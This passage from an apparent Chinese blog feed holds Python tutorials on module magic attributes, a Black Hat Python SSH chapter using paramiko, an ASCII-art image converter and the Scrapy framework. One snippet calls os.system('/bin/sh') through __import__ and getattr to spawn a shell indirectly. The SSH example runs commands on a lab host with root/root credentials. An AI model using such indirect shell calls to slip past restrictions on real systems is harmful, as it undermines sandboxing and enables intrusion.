class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 或</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>__author__ <span class=\"token operator\">=</span> <span class=\"token string\">'1asy'</span></pre></td></tr></table></figure><ol start=\"2\">\n<li><em>all</em><br />\n 该属性不是模块默认的，需要手动定义，它的功能有二：</li>\n</ol>\n<p>记录一个模块有哪些重要的、对外开发的类、方法或变量等，或记录一个包哪些对外开放的模块；</p>\n<p>限制导入，当使用 <code>“from xxx import *”</code>  形式导入时，实际导入的只有__all__属性中的同名的对象而不是所有，但对于 <code>“from xxx import xxx”</code>  指定了具体的名字则 all 属性被忽略。</p>\n<h2 id=\"魔法方法\"><a class=\"anchor\" href=\"#魔法方法\">#</a> 魔法方法</h2>\n<h3 id=\"_import_\"><a class=\"anchor\" href=\"#_import_\">#</a> _<em>import</em>_</h3>\n<p>该魔法方法是 import 触发，即 <code>import os </code> 相当于 <code>os = __import__('os')</code> ，也可以直接使用，主要用于模块延迟加载，或重载模块。</p>\n<p><span class=\"label\">参数：</span><br />\nname: 模块的名字；<br />\nglobal: 包含全局变量的字典，采用默认值 global ()<br />\n local: 包含局部变量的字典，采用默认值 local ()<br />\n fromlist: 被导入的子模块的名称<br />\n level: 指定使用绝对导入还是相对导入，0 表示只执行绝对导入。</p>\n<p><span class=\"label\">实例</span></p>\n<p>这段代码能在 Linux 下调用 shell</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">loader</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    a <span class=\"token operator\">=</span> <span class=\"token builtin\">__import__</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    loader<span class=\"token punctuation\">(</span><span class=\"token string\">\"os\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"system\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>__import__函数返回的是一个变量，代表一个模块，所有后续方法的调用都要在这个变量的基础上。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3dwLWJnL3AvOTg1NjMzOS5odG1s\">https://www.cnblogs.com/cwp-bg/p/9856339.html</span></p>\n",
            "tags": [
                "python内置属性"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%88%E4%B8%89%EF%BC%89-SSH%E4%B8%8ESSH%E9%9A%A7%E9%81%93/",
            "url": "https://or0kit.github.io/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%88%E4%B8%89%EF%BC%89-SSH%E4%B8%8ESSH%E9%9A%A7%E9%81%93/",
            "title": "BHP第二章（三）-SSH与SSH隧道",
            "date_published": "2021-01-27T15:43:48.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>通过 python 打造自己的 SSH (Secure Shell)。</p>\n<h1 id=\"通过paramiko使用ssh\"><a class=\"anchor\" href=\"#通过paramiko使用ssh\">#</a> 通过 paramiko 使用 SSH</h1>\n<h2 id=\"例子\"><a class=\"anchor\" href=\"#例子\">#</a> 例子</h2>\n<p>paramiko 是第三方库，要用 pip 安装。 <code>pip install paramiko</code></p>\n<p>在 python 的世界里，可以使用原始套接字和一些加密函数创建自己的 SSH 客户端或者服务端。但 python 中也有现成模块，使用 paramiko 库中的 PyCrypto 能让我们轻松使用 SSH2 协议</p>\n<p>在示例中，我们首先需要引入 <code>paramiko</code>  库，然后使用 <code>SSHClient()</code>  方法实例化对象，然后使用 <code>load_host_key()</code>  方法密钥认证的方式连接服务器，这里让实验可视化使用 <code>connect()</code>  方法以明文密码的方式连接服务器，连接服务器之前可以使用 <code>set_missing_host_key_policy()</code>  设置对于服务器密钥的策略，使用 <code>AutoAddPolicy()</code>  设置策略为自动添加服务器密钥，然后使用 <code>get_transport()</code>  与 <code>open_session()</code>  方法来得到 ssh 加密通道和打开线程，运用 if 语句与 acitve 属性判断线程是否存活，如果存活，使用 <code>exec_command()</code>  来执行我们想要执行的命令，通过 <code>recv()</code>  方法将命令在服务器执行后的结果返回给我们，这里也需要注意编码问题</p>\n<p><span class=\"label\">Code</span></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> paramiko</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">loging_shh</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">,</span> passwd<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    client <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\"># client.load_host_keys('/root/.ssh/konw_hosts')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    client<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    client<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>user<span class=\"token punctuation\">,</span> password<span class=\"token operator\">=</span>passwd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    ssh_session <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span>get_transport<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>open_session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> ssh_session<span class=\"token punctuation\">.</span>active<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        ssh_session<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ssh_session<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    loging_shh<span class=\"token punctuation\">(</span><span class=\"token string\">'192.168.199.128'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行程序后得到了服务器执行命令后的结果<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"编写返回命令的ssh\"><a class=\"anchor\" href=\"#编写返回命令的ssh\">#</a> 编写返回命令的 SSH</h2>\n<p>通常情况下，可以使用 SSH 客户端连接 SSH 服务器，但 Windows 本身不一定装有 SSH 服务端，所以我们需要反向将命令从 SSH 服务端发送给 SSH 客户端。（即客户端控制服务端）</p>\n<p><span class=\"label\">Code</span></p>\n<pre><code class=\"language-python\">\n\n</code></pre>\n",
            "tags": [
                "SSH隧道",
                "python",
                "SSH"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/Python-converts-pictures-into-character-drawings/",
            "url": "https://or0kit.github.io/Programming/Python/Python-converts-pictures-into-character-drawings/",
            "title": "Python converts pictures into character drawings",
            "date_published": "2021-01-12T09:44:20.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>看到一个非常有趣的 python 脚本，可以把图片生成对应的字符画。</p>\n<h2 id=\"code\"><a class=\"anchor\" href=\"#code\">#</a> Code</h2>\n<div class=\"note primary\">\n<p><strong>USAGE</strong><br />\npython <span class=\"exturl\" data-url=\"aHR0cDovL3BpYy1zdHIucHk=\">pic-str.py</span> xxx.jpg --width 200 --height 200 -o xxx.txt</p>\n</div>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># coding:utf-8</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> argparse</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 命令行输入参数处理</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>parser <span class=\"token operator\">=</span> argparse<span class=\"token punctuation\">.</span>ArgumentParser<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输入文件</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-o'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--output'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出文件</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--width'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token number\">140</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出字符画宽</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--height'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token number\">90</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出字符画高</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 获取参数</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>args <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>IMG <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span><span class=\"token builtin\">file</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>WIDTH <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span>width</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>HEIGHT <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span>height</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># OUTPUT = args.output # 输出到文件</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>ascii_char <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\|()1&#123;&#125;[]?-_+~&lt;>i!lI;:,\\\"^`'. \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># 将 256 灰度映射到 70 个字符上</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_char</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">,</span> alpha<span class=\"token operator\">=</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span> alpha <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">' '</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    length <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ascii_char<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    gray <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.2126</span> <span class=\"token operator\">*</span> r <span class=\"token operator\">+</span> <span class=\"token number\">0.7152</span> <span class=\"token operator\">*</span> g <span class=\"token operator\">+</span> <span class=\"token number\">0.0722</span> <span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">256.0</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> length</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> ascii_char<span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>gray <span class=\"token operator\">/</span> unit<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    im <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>IMG<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    im <span class=\"token operator\">=</span> im<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>WIDTH<span class=\"token punctuation\">,</span> HEIGHT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> Image<span class=\"token punctuation\">.</span>NEAREST<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    txt <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>HEIGHT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>WIDTH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            txt <span class=\"token operator\">+=</span> get_char<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>im<span class=\"token punctuation\">.</span>getpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        txt <span class=\"token operator\">+=</span> <span class=\"token string\">'\\n'</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>txt<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token comment\"># # 字符画输出到文件</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token comment\"># if OUTPUT:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token comment\">#     with open(OUTPUT, 'w') as f:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token comment\">#         f.write(txt)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token comment\"># else:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token comment\">#     with open(\"output.txt\", 'w') as f:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token comment\">#         f.write(txt)</span></pre></td></tr></table></figure><h2 id=\"结果展示\"><a class=\"anchor\" href=\"#结果展示\">#</a> 结果展示</h2>\n<p>非常可爱的一只小熊猫。我在画图工具里，把字符保存为了图片。</p>\n<p><img data-src=\"100.png\" alt=\"\" /></p>\n<p><img data-src=\"200.png\" alt=\"\" /></p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/scrapy%E6%A1%86%E6%9E%B6/",
            "url": "https://or0kit.github.io/Programming/Python/scrapy%E6%A1%86%E6%9E%B6/",
            "title": "scrapy框架",
            "date_published": "2020-12-28T09:47:19.000Z",
            "content_html": "<h1 id=\"什么是scrapy\"><a class=\"anchor\" href=\"#什么是scrapy\">#</a> 什么是 scrapy</h1>\n<font color=\"#00CED1\">\n<p>Scrapy 是一个为了爬取网站数据，提取结构性数据而编写的应用框架。可以应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。其最初是为了页面抓取 (更确切来说，网络抓取) 所设计的，也可以应用在获取 API 所返回的数据 (例如 Amazon Associates Web Services ) 或者通用的网络爬虫。Scrapy 其实是 Search+Python。Scrapy 使用 Twisted 这个异步网络库来处理网络通讯，架构清晰，并且包含了各种中间件接口，可以灵活的完成各种需求。</p>\n</font>\n<h1 id=\"scrapy架构\"><a class=\"anchor\" href=\"#scrapy架构\">#</a> scrapy 架构</h1>\n<h2 id=\"scrapy整体结构\"><a class=\"anchor\" href=\"#scrapy整体结构\">#</a> Scrapy 整体结构</h2>\n<font color=\"#00CED1\">\n<p><strong>1、引擎 (Scrapy Engine)</strong><br />\n 用来处理整个系统的数据流处理，触发事务。</p>\n<p><strong>2、调度器 (Scheduler)</strong><br />\n 用来接受引擎发过来的请求，压入队列中，并在引擎再次请求的时候返回。</p>\n<p><strong>3、下载器 (Downloader)</strong><br />\n 用于下载网页内容，并将网页内容返回给蜘蛛。</p>\n<p><strong>4、蜘蛛 (Spiders)</strong><br />\n 蜘蛛是主要干活的，用它来制订特定域名或网页的解析规则。编写用于分析 response 并提取 item (即获取到的 item) 或额外跟进的 URL 的类。<br />\n每个 spider 负责处理一个特定 (或一些) 网站。蜘蛛的整个抓取流程（周期）是这样的：</p>\n<ol>\n<li>首先获取第一个 URL 的初始请求，当请求返回后调取一个回调函数。第一个请求是通过调用 start_requests () 方法。该方法默认从 start_urls 中的 Url 中生成请求，并执行解析来调用回调函数。</li>\n<li>在回调函数中，你可以解析网页响应并返回项目对象和请求对象或两者的迭代。这些请求也将包含一个回调，然后被 Scrapy 下载，然后有指定的回调处理。</li>\n<li>在回调函数中，你解析网站的内容，同程使用的是 Xpath 选择器（但是你也可以使用 BeautifuSoup, lxml 或其他任何你喜欢的程序），并生成解析的数据项。</li>\n<li>最后，从蜘蛛返回的项目通常会进驻到项目管道。</li>\n</ol>\n<p><strong>5、项目管道 (Item Pipeline)</strong><br />\n 主要责任是负责处理有蜘蛛从网页中抽取的项目，他的主要任务是清晰、验证和存储数据。当页面被蜘蛛解析后，将被发送到项目管道，并经过几个特定的次序处理数据。每个项目管道的组件都是有一个简单的方法组成的 Python 类。他们获取了项目并执行他们的方法，同时他们还需要确定的是是否需要在项目管道中继续执行下一步或是直接丢弃掉不处理。<br />\n项目管道通常执行的过程有：</p>\n<ol>\n<li>清洗 HTML 数据</li>\n<li>验证解析到的数据（检查项目是否包含必要的字段）</li>\n<li>检查是否是重复数据（如果重复就删除）</li>\n<li>将解析到的数据存储到数据库中</li>\n</ol>\n<p><strong>6、下载器中间件 (Downloader Middlewares)</strong><br />\n 位于 Scrapy 引擎和下载器之间的钩子框架，主要是处理 Scrapy 引擎与下载器之间的请求及响应。它提供了一个自定义的代码的方式来拓展 Scrapy 的功能。下载中间器是一个处理请求和响应的钩子框架。他是轻量级的，对 Scrapy 尽享全局控制的底层的系统。</p>\n<p><strong>7、蜘蛛中间件 (Spider Middlewares)</strong><br />\n 介于 Scrapy 引擎和蜘蛛之间的钩子框架，主要工作是处理蜘蛛的响应输入和请求输出。它提供一个自定义代码的方式来拓展 Scrapy 的功能。蛛中间件是一个挂接到 Scrapy 的蜘蛛处理机制的框架，你可以插入自定义的代码来处理发送给蜘蛛的请求和返回蜘蛛获取的响应内容和项目。</p>\n<p><strong>8、调度中间件 (Scheduler Middlewares)</strong><br />\n 介于 Scrapy 引擎和调度之间的中间件，从 Scrapy 引擎发送到调度的请求和响应。他提供了一个自定义的代码来拓展 Scrapy 的功能。</p>\n<p><strong>数据处理流程</strong><br />\n<img data-src=\"image001.jpg\" alt=\"\" /></p>\n<p>如图所示，显示的是 Scrapy 爬虫执行流程，绿线是数据流向，首先从初始 URL 开始，Scheduler 会将其交给 Downloader 进行下载，下载之后会交给 Spider 进行分析，Spider 分析出来的结果有两种：一种是需要进一步抓取的链接，例如之前分析的 “下一页” 的链接，这些东西会被传回 Scheduler；另一种是需要保存的数据，它们则被送到 Item Pipeline 那里，那是对数据进行后期处理（详细分析、过滤、存储等）的地方。另外，在数据流动的通道里还可以安装各种中间件，进行必要的处理。</p>\n<p>Scrapy 中的数据流由执行引擎控制，其过程如下:</p>\n<ol>\n<li>引擎打开一个网站 (open a domain)，找到处理该网站的 Spider 并向该 spider 请求第一个要爬取的 URL (s)。</li>\n<li>引擎从 Spider 中获取到第一个要爬取的 URL 并在调度器 (Scheduler) 以 Request 调度。</li>\n<li>引擎向调度器请求下一个要爬取的 URL。</li>\n<li>调度器返回下一个要爬取的 URL 给引擎，引擎将 URL 通过下载中间件 (请求 (request) 方向) 转发给下载器 (Downloader)。</li>\n<li>一旦页面下载完毕，下载器生成一个该页面的 Response, 并将其通过下载中间件 (返回 (response) 方向) 发送给引擎。</li>\n<li>引擎从下载器中接收到 Response 并通过 Spider 中间件 (输入方向) 发送给 Spider 处理。</li>\n<li>Spider 处理 Response 并返回爬取到的 Item 及 (跟进的) 新的 Request 给引擎。</li>\n<li>引擎将 (Spider 返回的) 爬取到的 Item 给 Item Pipeline，将 (Spider 返回的) Request 给调度器。</li>\n<li>(从第二步) 重复直到调度器中没有更多地 request，引擎关闭该网站</li>\n</ol>\n</font>\n<h2 id=\"scrapy命令行工具\"><a class=\"anchor\" href=\"#scrapy命令行工具\">#</a> Scrapy 命令行工具</h2>\n<font color=\"green\">\n<p>Scrapy 是通过 scrapy 命令行工具进行控制的。这里我们称之为 “Scrapy tool” 以用来和子命令进行区分。对于子命令，我们称为 “command” 或者 “Scrapy commands”。Scrapy tool 针对不同的目的提供了多个命令，每个命令支持不同的参数和选项</p>\n</font>\n<h2 id=\"默认的scrapy-项目结构\"><a class=\"anchor\" href=\"#默认的scrapy-项目结构\">#</a> 默认的 Scrapy 项目结构</h2>\n<font color=\"DeepSkyBlue\">\n<p>在开始对命令行工具以及子命令的探索前，让我们首先了解一下 Scrapy 的项目的目录结构。虽然可以被修改，但所有的 Scrapy 项目默认有类似于下边的文件结构:</p>\n<pre><code>scrapy.cfg\n    myproject/\n        __init__.py\n        items.py\n        middlewares.py\n        pipelines.py\n        settings.py\n        spiders/\n            __init__.py\n            spider1.py\n            spider2.py\n            ...\n</code></pre>\n<ol>\n<li>scrapy.cfg<br />\n 存放的目录被认为是项目的根目录。该文件中包含 python 模块名的字段定义了项目的设置。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2l0ZW1zLnB5\">items.py</span><br />\n 该文件中包含了 scrapy 数据容器模型代码。<br />\nItem 对象是种简单的容器，保存了爬取到得数据。其提供了类似于词典 (dictionary-like) 的 API 以及用于声明可用字段的简单语法。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL21pZGRsZXdhcmVzLnB5\">middlewares.py</span><br />\n 该文件中包含下载器中间件和爬虫中间件模型代码。<br />\n下载器中间件是介于 Scrapy 的 request/response 处理的钩子框架。是用于全局修改 Scrapy request 和 response 的一个轻量、底层的系统。<br />\n爬虫中间件是介入到 Scrapy 的 spider 处理机制的钩子框架，您可以添加代码来处理发送给 Spiders 的 response 及 spider 产生的 item 和 request。。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3BpcGVsaW5lcy5weQ==\">pipelines.py</span><br />\n 每个管道组件是实现了简单方法的 Python 类。<br />\n他们接收到 Item 并通过它执行一些行为，同时也决定此 Item 是否继续通过后续的管道组件，或是被丢弃而不再进行处理。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3NldHRpbmdzLnB5\">settings.py</span><br />\nScrapy 设定 (settings) 提供了定制 Scrapy 组件的方法。<br />\n您可以控制包括核心 (core)，插件 (extension)，pipeline 及 spider 组件。</li>\n</ol>\n</font>\n<h1 id=\"编写第一个scrapy爬虫\"><a class=\"anchor\" href=\"#编写第一个scrapy爬虫\">#</a> 编写第一个 Scrapy 爬虫</h1>\n<font color=\"BlueViolet\">\n<p>任务:</p>\n<ol>\n<li>创建一个 Scrapy 项目</li>\n<li>定义提取的 Item</li>\n<li>编写爬取网站的 spider 并提取 Item</li>\n<li>编写 Item Pipeline 来存储提取到的 Item (即数据)</li>\n</ol>\n</font>\n<h2 id=\"创建项目\"><a class=\"anchor\" href=\"#创建项目\">#</a> 创建项目</h2>\n<font color=\"BlueViolet\">\n<p>在开始爬取之前，您必须创建一个新的 Scrapy 项目。<br />\n进入您打算存储代码的目录中，运行下列命令: <code>scrapy startproject tutorial</code> <br />\n 该命令将会创建包含下列内容的 tutorial 目录:</p>\n<pre><code>tutorial/\n    scrapy.cfg\n    tutorial/\n        __init__.py\n        items.py\n        pipelines.py\n        settings.py\n        spiders/\n            __init__.py\n            ...\n</code></pre>\n<p>这些文件分别是:</p>\n<ul>\n<li>scrapy.cfg: 项目的配置文件</li>\n<li>tutorial/: 该项目的 python 模块。之后您将在此加入代码。</li>\n<li>tutorial/items.py: 项目中的 item 文件。</li>\n<li>tutorial/pipelines.py: 项目中的 pipelines 文件。</li>\n<li>tutorial/settings.py: 项目的设置文件。</li>\n<li>tutorial/spiders/: 放置 spider 代码的目录</li>\n</ul>\n</font>\n<h2 id=\"定义item\"><a class=\"anchor\" href=\"#定义item\">#</a> 定义 Item</h2>\n<font color=\"BlueViolet\">\n<p>Item 是保存爬取到的数据的容器；其使用方法和 python 字典类似，并且提供了额外保护机制来避免拼写错误导致的未定义字段错误。<br />\n类似在 ORM 中做的一样，您可以通过创建一个 scrapy.Item 类，并且定义类型为 scrapy.Field 的类属性来定义一个 